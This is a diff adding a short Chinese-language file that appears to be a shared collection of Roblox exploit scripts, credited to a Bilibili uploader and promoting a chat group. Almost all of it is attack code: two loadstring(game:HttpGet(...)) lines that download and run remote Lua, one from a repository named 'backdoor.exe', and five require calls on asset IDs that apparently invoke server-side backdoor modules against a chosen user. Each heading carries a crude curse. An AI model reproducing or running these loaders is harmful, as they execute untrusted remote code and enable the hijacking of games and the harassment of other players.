@@ -1,0 +1,25 @@
+免责：由b站ka-c-整合
+进群聊940599816了解更多（请勿圈钱，圈钱死母）
+执行器：（请勿圈钱，圈钱死母）
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+
+执行器 二：（请勿圈钱，圈钱死母）
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-hub-without-hint-19587"))()
+
+脚本：（请勿圈钱，圈钱死母）
+一：（请勿圈钱，圈钱死母）
+
+require(6858594080).KrnKidsSus("用户")
+
+二：（请勿圈钱，圈钱死母）
+require(14125553864):Fire("用户", "c00lkidd")
+
+三：（请勿圈钱，圈钱死母）
+require(14829670677).EDITL0L("用户")
+
+四：
+require(17340805099).ez("用户")
+
+五：require(78790302691160):Hload("用户")
+
+
